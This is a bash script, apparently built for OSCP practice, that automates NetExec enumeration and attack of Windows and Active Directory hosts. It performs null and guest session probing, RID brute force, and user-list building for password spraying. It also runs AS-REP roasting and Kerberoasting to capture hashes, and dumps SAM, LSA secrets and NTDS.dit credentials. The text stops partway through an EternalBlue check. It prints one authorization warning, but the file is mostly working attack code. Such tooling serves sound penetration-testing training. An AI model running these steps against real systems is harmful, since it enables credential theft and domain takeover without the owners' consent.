#!/bin/bash

# =============================================================
#  Windows Enumeration Script — NetExec (nxc)
#  Usage: ./winenum.sh -t <target> [options]
# =============================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

# ---- Defaults ----
TARGET=""
USERNAME=""
PASSWORD=""
HASH=""
DOMAIN=""
OUTPUT_DIR=""
NULL_SESSION=false
SKIP_CONFIRM=false

banner() {
    echo -e "${CYAN}"
    echo "  ██╗    ██╗██╗███╗   ██╗███████╗███╗   ██╗██╗   ██╗███╗   ███╗"
    echo "  ██║    ██║██║████╗  ██║██╔════╝████╗  ██║██║   ██║████╗ ████║"
    echo "  ██║ █╗ ██║██║██╔██╗ ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║"
    echo "  ██║███╗██║██║██║╚██╗██║██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║"
    echo "  ╚███╔███╔╝██║██║ ╚████║███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║"
    echo "   ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝"
    echo -e "  OSCP Windows Enumeration — NetExec Edition${NC}"
    echo ""
}

usage() {
    echo -e "${YELLOW}Usage:${NC} $0 -t <target> [options]"
    echo ""
    echo "  Required:"
    echo "    -t  <ip/range>   Target IP, range, or CIDR (e.g. 10.10.10.5 or 10.10.10.0/24)"
    echo ""
    echo "  Authentication (choose one):"
    echo "    -u  <username>   Username"
    echo "    -p  <password>   Password"
    echo "    -H  <NT hash>    Pass-the-hash (NT hash)"
    echo "    -d  <domain>     Domain name (optional, improves accuracy)"
    echo "    -n               Null/anonymous session (no creds)"
    echo ""
    echo "  Other:"
    echo "    -o  <dir>        Output directory (default: ./winenum_<target>)"
    echo "    -y               Skip confirmation prompt"
    echo "    -h               Show this help"
    echo ""
    echo "Examples:"
    echo "  $0 -t 10.10.10.5 -n"
    echo "  $0 -t 10.10.10.5 -u administrator -p 'P@ssw0rd'"
    echo "  $0 -t 10.10.10.5 -u administrator -H aad3b435b51404eeaad3b435b51404ee:NTLMHASHHERE -d corp.local"
    exit 1
}

check_deps() {
    echo -e "${CYAN}[*] Checking dependencies...${NC}"
    local missing=0
    for cmd in nxc netexec; do
        if command -v "$cmd" &>/dev/null; then
            NXC_BIN="$cmd"
            echo -e "${GREEN}[+] Found: ${cmd}${NC}"
            missing=0
            break
        fi
        missing=1
    done
    if [ "$missing" -eq 1 ]; then
        echo -e "${RED}[-] 'netexec' (nxc) not found.${NC}"
        echo -e "    Install: pip3 install netexec  OR  apt install netexec"
        exit 1
    fi
}

build_auth() {
    AUTH_ARGS=()
    if [ "$NULL_SESSION" = true ]; then
        AUTH_ARGS+=("-u" "" "-p" "")
        echo -e "${YELLOW}[*] Using null/anonymous session${NC}"
    else
        [ -n "$USERNAME" ] && AUTH_ARGS+=("-u" "$USERNAME")
        [ -n "$PASSWORD" ] && AUTH_ARGS+=("-p" "$PASSWORD")
        [ -n "$HASH" ]     && AUTH_ARGS+=("-H" "$HASH")
        [ -n "$DOMAIN" ]   && AUTH_ARGS+=("-d" "$DOMAIN")
        if [ ${#AUTH_ARGS[@]} -eq 0 ]; then
            echo -e "${YELLOW}[!] No credentials provided — trying null session.${NC}"
            AUTH_ARGS+=("-u" "" "-p" "")
        fi
    fi
}

run_nxc() {
    local name="$1"
    local outfile="$2"
    shift 2
    local args=("$@")

    echo ""
    echo -e "${YELLOW}[*] ${name}${NC}"
    echo -e "    ${NXC_BIN} ${args[*]}"

    $NXC_BIN "${args[@]}" 2>/dev/null | tee "${outfile}.txt"

    local status=${PIPESTATUS[0]}
    if [ "$status" -eq 0 ]; then
        echo -e "${GREEN}[+] ${name} — done${NC}"
    else
        echo -e "${RED}[-] ${name} — error or no results${NC}"
    fi
}

section() {
    echo ""
    echo -e "${CYAN}======================================================${NC}"
    echo -e "${CYAN}  $1${NC}"
    echo -e "${CYAN}======================================================${NC}"
}

# ============================================================
# extract_users <output_file>
# Parses nxc output files and appends confirmed usernames to
# _users_raw.txt. Handles three distinct nxc output formats:
#
# FORMAT 1 — smb --users:
#   SMB  10.x  445  HOST  [+] DOMAIN\username  badpwdcount:0  desc:...
#   logger.highlight() = [+], first token after tag is DOMAIN\username.
#   Anchor: backslash present in the token immediately after [+].
#
# FORMAT 2 — ldap --users  (source: nxc ldap.py logger.highlight()):
#   LDAP  10.x  389  HOST  [*] username    2024-01-15 09:00:00  0  desc
#   LDAP  10.x  389  HOST  [*] krbtgt      <never>              0
#   logger.highlight() = [*], fixed-width columns: sAMAccountName, then
#   pwd_last_set, then badPwdCount, then description.
#   Anchor: the field two positions after [*] is always a date (20xx-)
#   or the literal "<never>" — this is the pwd_last_set column and is
#   present on every user data line. Header and count lines never match.
#
# FORMAT 3 — --rid-brute:
#   SMB  10.x  445  HOST  500: DOMAIN\Administrator (SidTypeUser)
#   SMB  10.x  445  HOST  512: DOMAIN\Domain Admins (SidTypeGroup)
#   Anchor: (SidTypeUser) at end of line. SidTypeGroup/Alias skipped.
# ============================================================
extract_users() {
    local src="$1"
    [ -f "$src" ] || return

    # FORMAT 1: smb --users — [+] DOMAIN\username ...
    awk '
        /\[\+\]/ {
            for (i = 1; i <= NF; i++) {
                if ($i == "[+]" && (i+1) <= NF) {
                    token = $(i+1)
                    if (index(token, "\\") > 0) {
                        n = split(token, parts, "\\")
                        if (parts[n] != "") print parts[n]
                    }
                    break
                }
            }
        }
    ' "$src" 2>/dev/null >> "${OUTPUT_DIR}/_users_raw.txt"

    # FORMAT 2: ldap --users — no tag, fixed columns:
    #   LDAP  IP  PORT  HOST  username  date_or_never  badpw  [desc]
    # Real output (from nxc source logger.highlight(), no [*]/[+] prefix):
    #   LDAP  10.x  389  DC01  Administrator  2026-01-12 11:00:19  1  Built-in...
    #   LDAP  10.x  389  DC01  mprice         2026-01-17 11:40:55  0
    #   LDAP  10.x  389  DC01  krbtgt         <never>              0
    # Anchor: $6 is the pwd_last_set column — always "20xx-" or "<never>".
    # This excludes the header ($6 == "-Last"), count lines ($6 == "domain"),
    # and all [*]/[+] tagged lines ($5 starts with "[").
    awk '
        ($6 ~ /^20[0-9][0-9]-/ || $6 == "<never>") && $5 !~ /^\[/ {
            print $5
        }
    ' "$src" 2>/dev/null >> "${OUTPUT_DIR}/_users_raw.txt"

    # FORMAT 3: --rid-brute — NNN: DOMAIN\username (SidTypeUser)
    awk '
        /\(SidTypeUser\)/ {
            for (i = 1; i <= NF; i++) {
                if (index($i, "\\") > 0 && $i !~ /^\(/) {
                    n = split($i, parts, "\\")
                    if (parts[n] != "") print parts[n]
                    break
                }
            }
        }
    ' "$src" 2>/dev/null >> "${OUTPUT_DIR}/_users_raw.txt"
}

# ============================================================
# build_user_list
# Deduplicates _users_raw.txt, removes known built-in accounts,
# writes sorted users.txt and a wordlist-ready usernames.txt.
# ============================================================
BUILTIN_USERS=(
    "Administrator" "Guest" "krbtgt" "DefaultAccount"
    "WDAGUtilityAccount" "SYSTEM" "LOCAL SERVICE" "NETWORK SERVICE"
)

build_user_list() {
    local raw="${OUTPUT_DIR}/_users_raw.txt"
    [ -f "$raw" ] || return

    local all_users
    all_users=$(sort -u "$raw" | grep -v '^$')

    # Separate built-ins from non-standard
    local standard_users=()
    local nonstandard_users=()

    while IFS= read -r u; do
        local is_builtin=0
        for b in "${BUILTIN_USERS[@]}"; do
            [[ "${u,,}" == "${b,,}" ]] && is_builtin=1 && break
        done
        if [ "$is_builtin" -eq 1 ]; then
            standard_users+=("$u")
        else
            nonstandard_users+=("$u")
        fi
    done <<< "$all_users"

    # Write combined users.txt (non-standard first, then built-ins)
    USER_LIST="${OUTPUT_DIR}/users.txt"
    {
        echo "# ---- Non-standard / potentially interesting users ----"
        printf '%s\n' "${nonstandard_users[@]}" | sort -u
        echo ""
        echo "# ---- Built-in / default accounts ----"
        printf '%s\n' "${standard_users[@]}" | sort -u
    } > "$USER_LIST"

    # Wordlist-clean version (no comments, for spraying/cracking)
    USERNAMES_WORDLIST="${OUTPUT_DIR}/usernames.txt"
    printf '%s\n' "${nonstandard_users[@]}" "${standard_users[@]}" \
        | grep -v '^#' | grep -v '^$' | sort -u > "$USERNAMES_WORDLIST"

    echo -e "${GREEN}[+] User list written:${NC}"
    echo -e "    ${USER_LIST}  (annotated)"
    echo -e "    ${USERNAMES_WORDLIST}  (wordlist-clean)"
    echo -e "${CYAN}    Total unique users: $(grep -vc '^#\|^$' "$USER_LIST" 2>/dev/null)${NC}"
    if [ ${#nonstandard_users[@]} -gt 0 ]; then
        echo -e "${MAGENTA}[*] Non-standard users (${#nonstandard_users[@]}):${NC}"
        printf '    %s\n' "${nonstandard_users[@]}"
    fi
}

# ============================================================
# extract_groups <output_file> <source_label>
# Parses nxc group-enumeration output and appends to the
# combined _groups_raw.txt with a source label so you can
# tell whether a group came from SMB or LDAP.
#
# nxc output looks like:
#   LDAP  10.x  389  HOST  [+] Domain Admins  512
#   SMB   10.x  445  HOST  [+] Administrators
# ============================================================
extract_groups() {
    local src="$1"
    local label="$2"   # e.g. "SMB" or "LDAP"
    [ -f "$src" ] || return

    # Strip leading protocol/IP/port/host noise, grab group name
    # Lines: <PROTO>  <IP>  <PORT>  <HOST>  [+] <GroupName>  [<count>]
    grep -Po '(?<=\[\+\]\s{1,10}).*' "$src" 2>/dev/null \
        | sed 's/[[:space:]]*[0-9]*[[:space:]]*$//' \
        | sed 's/[[:space:]]*$//' \
        | grep -v '^$' \
        | while IFS= read -r grp; do
            echo "${label}|${grp}"
          done >> "${OUTPUT_DIR}/_groups_raw.txt"
}

# ============================================================
# BUILTIN_GROUPS — well-known Windows/AD built-in groups.
# Anything NOT in this list is flagged as non-standard.
# ============================================================
BUILTIN_GROUPS=(
    "Account Operators"
    "Administrators"
    "Allowed RODC Password Replication Group"
    "Backup Operators"
    "Certificate Service DCOM Access"
    "Cert Publishers"
    "Cloneable Domain Controllers"
    "Cryptographic Operators"
    "Denied RODC Password Replication Group"
    "Distributed COM Users"
    "DnsAdmins"
    "DnsUpdateProxy"
    "Domain Admins"
    "Domain Computers"
    "Domain Controllers"
    "Domain Guests"
    "Domain Users"
    "Enterprise Admins"
    "Enterprise Key Admins"
    "Enterprise Read-only Domain Controllers"
    "Event Log Readers"
    "Group Policy Creator Owners"
    "Guests"
    "Hyper-V Administrators"
    "IIS_IUSRS"
    "Incoming Forest Trust Builders"
    "Key Admins"
    "Network Configuration Operators"
    "Performance Log Users"
    "Performance Monitor Users"
    "Pre-Windows 2000 Compatible Access"
    "Print Operators"
    "Protected Users"
    "RAS and IAS Servers"
    "RDS Endpoint Servers"
    "RDS Management Servers"
    "RDS Remote Access Servers"
    "Read-only Domain Controllers"
    "Remote Desktop Users"
    "Remote Management Users"
    "Replicator"
    "Schema Admins"
    "Server Operators"
    "Storage Replica Administrators"
    "System Managed Accounts Group"
    "Terminal Server License Servers"
    "Users"
    "Windows Authorization Access Group"
    "WinRMRemoteWMIUsers__"
)

# ============================================================
# build_group_list
# Merges SMB + LDAP group data, deduplicates, separates
# non-standard groups, writes groups.txt and nonstandard_groups.txt
# ============================================================
build_group_list() {
    local raw="${OUTPUT_DIR}/_groups_raw.txt"
    [ -f "$raw" ] || return

    # Deduplicate by group name (case-insensitive), keep first source seen
    declare -A seen_groups
    declare -A group_sources

    while IFS='|' read -r src grp; do
        local key="${grp,,}"
        if [ -z "${seen_groups[$key]+_}" ]; then
            seen_groups[$key]="$grp"
            group_sources[$key]="$src"
        else
            # Append additional source if different
            if [[ "${group_sources[$key]}" != *"$src"* ]]; then
                group_sources[$key]="${group_sources[$key]},${src}"
            fi
        fi
    done < "$raw"

    local standard=()
    local nonstandard=()

    for key in "${!seen_groups[@]}"; do
        local grp="${seen_groups[$key]}"
        local is_builtin=0
        for b in "${BUILTIN_GROUPS[@]}"; do
            [[ "${grp,,}" == "${b,,}" ]] && is_builtin=1 && break
        done
        if [ "$is_builtin" -eq 1 ]; then
            standard+=("${group_sources[$key]}|${grp}")
        else
            nonstandard+=("${group_sources[$key]}|${grp}")
        fi
    done

    IFS=$'\n' standard=($(sort <<<"${standard[*]}")); unset IFS
    IFS=$'\n' nonstandard=($(sort <<<"${nonstandard[*]}")); unset IFS

    GROUP_LIST="${OUTPUT_DIR}/groups.txt"
    NONSTANDARD_GROUPS="${OUTPUT_DIR}/nonstandard_groups.txt"

    {
        echo "# FORMAT: SOURCE|GROUP_NAME"
        echo "# SOURCE: SMB = local groups (SAM), LDAP = domain groups (AD)"
        echo ""
        echo "# ---- Non-standard / custom groups (investigate these) ----"
        printf '%s\n' "${nonstandard[@]}"
        echo ""
        echo "# ---- Built-in / default groups ----"
        printf '%s\n' "${standard[@]}"
    } > "$GROUP_LIST"

    # Clean nonstandard_groups.txt — group names only, no comments
    printf '%s\n' "${nonstandard[@]}" \
        | cut -d'|' -f2 \
        | sort -u > "$NONSTANDARD_GROUPS"

    echo -e "${GREEN}[+] Group lists written:${NC}"
    echo -e "    ${GROUP_LIST}  (annotated, all groups)"
    echo -e "    ${NONSTANDARD_GROUPS}  (non-standard groups only)"
    echo -e "${CYAN}    Total unique groups: ${#seen_groups[@]}${NC}"

    if [ ${#nonstandard[@]} -gt 0 ]; then
        echo -e "${RED}[!!!] Non-standard groups found (${#nonstandard[@]}) — enumerate members:${NC}"
        for entry in "${nonstandard[@]}"; do
            local src="${entry%%|*}"
            local grp="${entry#*|}"
            echo -e "    ${MAGENTA}[${src}]${NC} ${grp}"
        done
    else
        echo -e "${YELLOW}[!] No non-standard groups identified.${NC}"
    fi
}

# ---- Parse args ----
while getopts "t:u:p:H:d:o:nyh" opt; do
    case "$opt" in
        t) TARGET="$OPTARG" ;;
        u) USERNAME="$OPTARG" ;;
        p) PASSWORD="$OPTARG" ;;
        H) HASH="$OPTARG" ;;
        d) DOMAIN="$OPTARG" ;;
        o) OUTPUT_DIR="$OPTARG" ;;
        n) NULL_SESSION=true ;;
        y) SKIP_CONFIRM=true ;;
        h) usage ;;
        *) usage ;;
    esac
done

[ -z "$TARGET" ] && usage

OUTPUT_DIR="${OUTPUT_DIR:-./winenum_$(echo "$TARGET" | tr '/' '_')}"

banner
check_deps

echo -e "${GREEN}[+] Target:     ${TARGET}${NC}"
echo -e "${GREEN}[+] Output dir: ${OUTPUT_DIR}${NC}"
[ -n "$USERNAME" ] && echo -e "${GREEN}[+] Username:   ${USERNAME}${NC}"
[ -n "$DOMAIN" ]   && echo -e "${GREEN}[+] Domain:     ${DOMAIN}${NC}"

if [ "$SKIP_CONFIRM" = false ]; then
    echo ""
    echo -e "${YELLOW}[!] Only use this script against systems you own or have explicit written permission to test.${NC}"
    echo -e "${YELLOW}    Unauthorized scanning is illegal.${NC}"
    echo ""
    read -rp "    Continue? [y/N] " confirm
    [[ "$confirm" =~ ^[Yy]$ ]] || exit 0
fi

mkdir -p "$OUTPUT_DIR"
LOG_FILE="${OUTPUT_DIR}/winenum.log"
exec > >(tee -a "$LOG_FILE") 2>&1

build_auth

echo -e "${GREEN}[+] Start time: $(date)${NC}"

# ============================================================
# STAGE 1 — Host reachability / SMB signing / OS fingerprint
# ============================================================
section "STAGE 1: Host Discovery & SMB Info"

run_nxc "SMB host info (OS, signing, hostname)" \
    "${OUTPUT_DIR}/01_smb_info" \
    smb "$TARGET"

# ============================================================
# STAGE 2 — Null / Anon session check
# ============================================================
section "STAGE 2: Null Session & Guest Access Check"

run_nxc "Null session check" \
    "${OUTPUT_DIR}/02_null_session" \
    smb "$TARGET" -u "" -p ""

run_nxc "Guest account check" \
    "${OUTPUT_DIR}/02_guest_session" \
    smb "$TARGET" -u "guest" -p ""

# ============================================================
# STAGE 3 — Authentication check
# ============================================================
section "STAGE 3: Authentication Validation"

run_nxc "Validate credentials" \
    "${OUTPUT_DIR}/03_auth_check" \
    smb "$TARGET" "${AUTH_ARGS[@]}"

# ============================================================
# STAGE 4 — SMB Shares
# ============================================================
section "STAGE 4: SMB Share Enumeration"

run_nxc "List SMB shares" \
    "${OUTPUT_DIR}/04_smb_shares" \
    smb "$TARGET" "${AUTH_ARGS[@]}" --shares

run_nxc "Spider readable shares (depth 2)" \
    "${OUTPUT_DIR}/04_smb_spider" \
    smb "$TARGET" "${AUTH_ARGS[@]}" -M spider_plus \
    -o DOWNLOAD_FLAG=False MAX_DEPTH=2

# ============================================================
# STAGE 4b — Guest Account Share Enumeration
# ============================================================
section "STAGE 4b: Guest Account Share Enumeration"

run_nxc "List SMB shares as guest" \
    "${OUTPUT_DIR}/04b_guest_shares" \
    smb "$TARGET" -u "guest" -p "" --shares

run_nxc "Spider shares as guest (depth 2)" \
    "${OUTPUT_DIR}/04b_guest_spider" \
    smb "$TARGET" -u "guest" -p "" -M spider_plus \
    -o DOWNLOAD_FLAG=False MAX_DEPTH=2

run_nxc "List SMB shares as guest (local-auth)" \
    "${OUTPUT_DIR}/04b_guest_shares_local" \
    smb "$TARGET" -u "guest" -p "" --local-auth --shares

# ============================================================
# STAGE 4c — Guest RID Brute Force
# ============================================================
section "STAGE 4c: Guest RID Brute Force"

run_nxc "RID brute force as guest (500-1200)" \
    "${OUTPUT_DIR}/04c_guest_rid_brute" \
    smb "$TARGET" -u "guest" -p "" --rid-brute 1200

run_nxc "RID brute force as guest (local-auth, 500-1200)" \
    "${OUTPUT_DIR}/04c_guest_rid_brute_local" \
    smb "$TARGET" -u "guest" -p "" --local-auth --rid-brute 1200

# Feed RID brute results into user extraction
extract_users "${OUTPUT_DIR}/04c_guest_rid_brute.txt"
extract_users "${OUTPUT_DIR}/04c_guest_rid_brute_local.txt"

# ============================================================
# STAGE 5 — User Enumeration
# ============================================================
section "STAGE 5: User Enumeration"

run_nxc "Enumerate local users" \
    "${OUTPUT_DIR}/05_local_users" \
    smb "$TARGET" "${AUTH_ARGS[@]}" --local-auth --users 2>/dev/null || \
run_nxc "Enumerate domain users" \
    "${OUTPUT_DIR}/05_users" \
    smb "$TARGET" "${AUTH_ARGS[@]}" --users

run_nxc "Enumerate RID brute (500-1200)" \
    "${OUTPUT_DIR}/05_rid_brute" \
    smb "$TARGET" "${AUTH_ARGS[@]}" --rid-brute 1200

# Feed all user sources into extraction
extract_users "${OUTPUT_DIR}/05_local_users.txt"
extract_users "${OUTPUT_DIR}/05_users.txt"
extract_users "${OUTPUT_DIR}/05_rid_brute.txt"

# ============================================================
# STAGE 6 — Group Enumeration
# ============================================================
section "STAGE 6: Group Enumeration"

run_nxc "Enumerate local groups" \
    "${OUTPUT_DIR}/06_local_groups" \
    ldap "$TARGET" "${AUTH_ARGS[@]}" --local-groups

run_nxc "Enumerate domain groups" \
    "${OUTPUT_DIR}/06_groups" \
    ldap "$TARGET" "${AUTH_ARGS[@]}" --groups

# Also pull groups via SMB for cross-validation and local scope
run_nxc "Enumerate local groups via SMB" \
    "${OUTPUT_DIR}/06_smb_local_groups" \
    smb "$TARGET" "${AUTH_ARGS[@]}" --local-groups

# Feed all group sources into extraction with source labels
extract_groups "${OUTPUT_DIR}/06_local_groups.txt"  "LDAP-local"
extract_groups "${OUTPUT_DIR}/06_groups.txt"         "LDAP-domain"
extract_groups "${OUTPUT_DIR}/06_smb_local_groups.txt" "SMB-local"

# ============================================================
# STAGE 6 POST-PROCESSING — Build merged user & group lists
# ============================================================
section "STAGE 6 POST: Building User & Group Lists"

build_user_list
echo ""
build_group_list

# ============================================================
# STAGE 6b — Group Member Enumeration
# Parses group names from Stage 6 output, queries members
# for each group. High-value groups are checked first.
# Non-standard groups are also automatically included.
# ============================================================
section "STAGE 6b: Group Member Enumeration"

GROUP_FILE="${OUTPUT_DIR}/06_groups.txt"

if [ -s "$GROUP_FILE" ]; then
    # High-value groups to prioritize
    PRIORITY_GROUPS=(
        "Domain Admins"
        "Administrators"
        "Enterprise Admins"
        "Schema Admins"
        "Group Policy Creator Owners"
        "Remote Desktop Users"
        "Remote Management Users"
        "DnsAdmins"
        "Account Operators"
        "Backup Operators"
        "Server Operators"
        "Print Operators"
        "Domain Controllers"
    )

    # Parse all group names from nxc output
    ALL_GROUPS=$(grep -oP '(?<=\]\s{1,10})\S.*?(?=\s+\d+$|\s*$)' "$GROUP_FILE" 2>/dev/null \
        | sed 's/[[:space:]]*$//' \
        | sort -u)

    if [ -z "$ALL_GROUPS" ]; then
        ALL_GROUPS=$(awk '/\[\+\]/{for(i=NF;i>1;i--){if($i~/^[0-9]+$/){print substr($0, index($0,$2)); break}}}' "$GROUP_FILE" \
            | sed 's/[[:space:]]*[0-9]*[[:space:]]*$//' \
            | sort -u)
    fi

    # Append any non-standard groups not already in the parsed list
    if [ -s "${OUTPUT_DIR}/nonstandard_groups.txt" ]; then
        while IFS= read -r nsgrp; do
            if ! echo "$ALL_GROUPS" | grep -qi "^${nsgrp}$"; then
                ALL_GROUPS="${ALL_GROUPS}"$'\n'"${nsgrp}"
            fi
        done < "${OUTPUT_DIR}/nonstandard_groups.txt"
        ALL_GROUPS=$(echo "$ALL_GROUPS" | sort -u)
    fi

    if [ -z "$ALL_GROUPS" ]; then
        echo -e "${YELLOW}[!] Could not parse group names from ${GROUP_FILE}. Skipping member enumeration.${NC}"
    else
        echo -e "${GREEN}[+] Parsed group list. Checking priority groups first...${NC}"

        QUERIED=()

        # --- Priority groups first ---
        for grp in "${PRIORITY_GROUPS[@]}"; do
            if echo "$ALL_GROUPS" | grep -qi "^${grp}$"; then
                safe_name=$(echo "$grp" | tr ' ' '_' | tr -cd '[:alnum:]_-')
                echo ""
                echo -e "${MAGENTA}[*] Priority group: ${grp}${NC}"
                run_nxc "Members of '${grp}'" \
                    "${OUTPUT_DIR}/06b_members_${safe_name}" \
                    ldap "$TARGET" "${AUTH_ARGS[@]}" --groups "$grp"
                QUERIED+=("$grp")
                extract_users "${OUTPUT_DIR}/06b_members_${safe_name}.txt"
            fi
        done

        # --- Non-standard groups (highlighted separately) ---
        if [ -s "${OUTPUT_DIR}/nonstandard_groups.txt" ]; then
            echo ""
            echo -e "${RED}[!!!] Querying non-standard groups first — these may be high-value:${NC}"
            while IFS= read -r grp; do
                already=0
                for q in "${QUERIED[@]}"; do
                    [[ "${q,,}" == "${grp,,}" ]] && already=1 && break
                done
                [ "$already" -eq 1 ] && continue

                safe_name=$(echo "$grp" | tr ' ' '_' | tr -cd '[:alnum:]_-')
                echo -e "${RED}[*] Non-standard group: ${grp}${NC}"
                run_nxc "Members of non-standard group '${grp}'" \
                    "${OUTPUT_DIR}/06b_members_NONSTANDARD_${safe_name}" \
                    ldap "$TARGET" "${AUTH_ARGS[@]}" --groups "$grp"
                QUERIED+=("$grp")
                extract_users "${OUTPUT_DIR}/06b_members_NONSTANDARD_${safe_name}.txt"
            done < "${OUTPUT_DIR}/nonstandard_groups.txt"
        fi

        # --- Remaining groups ---
        echo ""
        echo -e "${CYAN}[*] Querying remaining groups...${NC}"
        while IFS= read -r grp; do
            already=0
            for q in "${QUERIED[@]}"; do
                [[ "${q,,}" == "${grp,,}" ]] && already=1 && break
            done
            [ "$already" -eq 1 ] && continue

            safe_name=$(echo "$grp" | tr ' ' '_' | tr -cd '[:alnum:]_-')
            run_nxc "Members of '${grp}'" \
                "${OUTPUT_DIR}/06b_members_${safe_name}" \
                ldap "$TARGET" "${AUTH_ARGS[@]}" --groups "$grp"
            extract_users "${OUTPUT_DIR}/06b_members_${safe_name}.txt"
        done <<< "$ALL_GROUPS"

        echo ""
        echo -e "${GREEN}[+] Group member enumeration complete. Files: ${OUTPUT_DIR}/06b_members_*.txt${NC}"

        # Rebuild user list now that member outputs are ingested
        echo ""
        echo -e "${CYAN}[*] Rebuilding user list with group member data...${NC}"
        build_user_list
    fi
else
    echo -e "${YELLOW}[!] No group output found at ${GROUP_FILE}. Run Stage 6 first or check credentials.${NC}"
fi

# ============================================================
# STAGE 7 — Password Policy
# ============================================================
section "STAGE 7: Password Policy"

run_nxc "Dump password policy" \
    "${OUTPUT_DIR}/07_pass_policy" \
    smb "$TARGET" "${AUTH_ARGS[@]}" --pass-pol

# ============================================================
# STAGE 8 — Logged-on & Sessions
# ============================================================
section "STAGE 8: Active Sessions & Logged-on Users"

run_nxc "Logged-on users" \
    "${OUTPUT_DIR}/08_loggedon" \
    smb "$TARGET" "${AUTH_ARGS[@]}" --loggedon-users

run_nxc "Active sessions" \
    "${OUTPUT_DIR}/08_sessions" \
    smb "$TARGET" "${AUTH_ARGS[@]}" --sessions

# Note: --loggedon-users and --sessions use a different output format
# (DOMAIN\username shown in a status line, not a [+] DOMAIN\user data line).
# These are left as raw files for manual review rather than risking noise.

# ============================================================
# STAGE 9 — WINRM (if available)
# ============================================================
section "STAGE 9: WinRM Access Check"

run_nxc "WinRM auth check" \
    "${OUTPUT_DIR}/09_winrm" \
    winrm "$TARGET" "${AUTH_ARGS[@]}"

# ============================================================
# STAGE 10 — LDAP (domain targets)
# ============================================================
section "STAGE 10: LDAP / Active Directory Enumeration"

run_nxc "LDAP info + DC detection" \
    "${OUTPUT_DIR}/10_ldap_info" \
    ldap "$TARGET" "${AUTH_ARGS[@]}"

run_nxc "LDAP users" \
    "${OUTPUT_DIR}/10_ldap_users" \
    ldap "$TARGET" "${AUTH_ARGS[@]}" --users --users-export "${OUTPUT_DIR}/usernames.txt"

run_nxc "LDAP groups" \
    "${OUTPUT_DIR}/10_ldap_groups" \
    ldap "$TARGET" "${AUTH_ARGS[@]}" --groups

run_nxc "LDAP password policy" \
    "${OUTPUT_DIR}/10_ldap_passpol" \
    ldap "$TARGET" "${AUTH_ARGS[@]}" --pass-pol

run_nxc "MachineAccountQuota" \
    "${OUTPUT_DIR}/10_maq" \
    ldap "$TARGET" "${AUTH_ARGS[@]}" -M maq

run_nxc "Find AD CS (certificate services)" \
    "${OUTPUT_DIR}/10_adcs" \
    ldap "$TARGET" "${AUTH_ARGS[@]}" -M adcs

# --users-export wrote usernames.txt directly — no parsing needed
# Fall back to awk parser only if export produced nothing
if [ -s "${OUTPUT_DIR}/usernames.txt" ]; then
    echo -e "${GREEN}[+] usernames.txt written by nxc: ${OUTPUT_DIR}/usernames.txt${NC}"
    echo -e "${CYAN}    Total: $(wc -l < "${OUTPUT_DIR}/usernames.txt") users${NC}"
else
    echo -e "${YELLOW}[!] --users-export produced no output, falling back to parser${NC}"
    extract_users "${OUTPUT_DIR}/10_ldap_users.txt"
fi

# Feed Stage 10 LDAP group output and rebuild group list
extract_groups "${OUTPUT_DIR}/10_ldap_groups.txt" "LDAP-domain"
echo ""
echo -e "${CYAN}[*] Final group list rebuild (post-LDAP)...${NC}"
build_group_list

# ============================================================
# STAGE 10b — ASREPRoast & Kerberoast
# ============================================================
section "STAGE 10b: ASREPRoast & Kerberoast"

ASREP_OUT="${OUTPUT_DIR}/asrep_hashes.txt"
KERB_OUT="${OUTPUT_DIR}/kerberoast_hashes.txt"

echo ""
echo -e "${YELLOW}[*] ASREPRoast check (no pre-auth users)${NC}"
echo -e "    ${NXC_BIN} ldap ${TARGET} ${AUTH_ARGS[*]} --asreproast ${ASREP_OUT}"
$NXC_BIN ldap "$TARGET" "${AUTH_ARGS[@]}" --asreproast "$ASREP_OUT" 2>/dev/null \
    | tee "${OUTPUT_DIR}/10_asreproast.txt"
if [ -s "$ASREP_OUT" ]; then
    echo -e "${RED}[!!!] ASREPRoast hashes captured: ${ASREP_OUT}${NC}"
else
    echo -e "${YELLOW}[!] No ASREPRoast hashes found (or requires domain context — try adding -d <domain>)${NC}"
fi

echo ""
echo -e "${YELLOW}[*] Kerberoastable accounts${NC}"
echo -e "    ${NXC_BIN} ldap ${TARGET} ${AUTH_ARGS[*]} --kerberoasting ${KERB_OUT}"
$NXC_BIN ldap "$TARGET" "${AUTH_ARGS[@]}" --kerberoasting "$KERB_OUT" 2>/dev/null \
    | tee "${OUTPUT_DIR}/10_kerberoast.txt"
if [ -s "$KERB_OUT" ]; then
    echo -e "${RED}[!!!] Kerberoast hashes captured: ${KERB_OUT}${NC}"
else
    echo -e "${YELLOW}[!] No Kerberoastable accounts found (or requires valid domain creds)${NC}"
fi

# ============================================================
# STAGE 11 — MSSQL (if port 1433 is open)
# ============================================================
section "STAGE 11: MSSQL Enumeration"

run_nxc "MSSQL auth check" \
    "${OUTPUT_DIR}/11_mssql" \
    mssql "$TARGET" "${AUTH_ARGS[@]}"

run_nxc "MSSQL privilege check (xp_cmdshell, sysadmin)" \
    "${OUTPUT_DIR}/11_mssql_priv" \
    mssql "$TARGET" "${AUTH_ARGS[@]}" -M mssql_priv

# ============================================================
# STAGE 12 — Privilege / Local Admin Check
# ============================================================
section "STAGE 12: Local Admin & Privilege Checks"

run_nxc "Check local admin access" \
    "${OUTPUT_DIR}/12_local_admin" \
    smb "$TARGET" "${AUTH_ARGS[@]}" --local-auth

run_nxc "SAM dump (requires admin)" \
    "${OUTPUT_DIR}/12_sam_dump" \
    smb "$TARGET" "${AUTH_ARGS[@]}" --sam

run_nxc "LSA secrets dump (requires admin)" \
    "${OUTPUT_DIR}/12_lsa_dump" \
    smb "$TARGET" "${AUTH_ARGS[@]}" --lsa

run_nxc "NTDS.dit dump — Domain Controller only (requires DA)" \
    "${OUTPUT_DIR}/12_ntds" \
    smb "$TARGET" "${AUTH_ARGS[@]}" --ntds 2>/dev/null

# Note: SAM/LSA/NTDS output is in credential dump format (user:RID:LM:NT:::),
# not nxc --users format. Parse those manually with e.g.:
#   awk -F: '{print $1}' 12_sam_dump.txt | grep -v '^#'

# ============================================================
# STAGE 13 — Useful Modules
# ============================================================
section "STAGE 13: Useful NSE-style Modules"

run_nxc "Check for MS17-010 (EternalBlue)" \
    "${OUTPUT_DIR}/13_ms17010" \
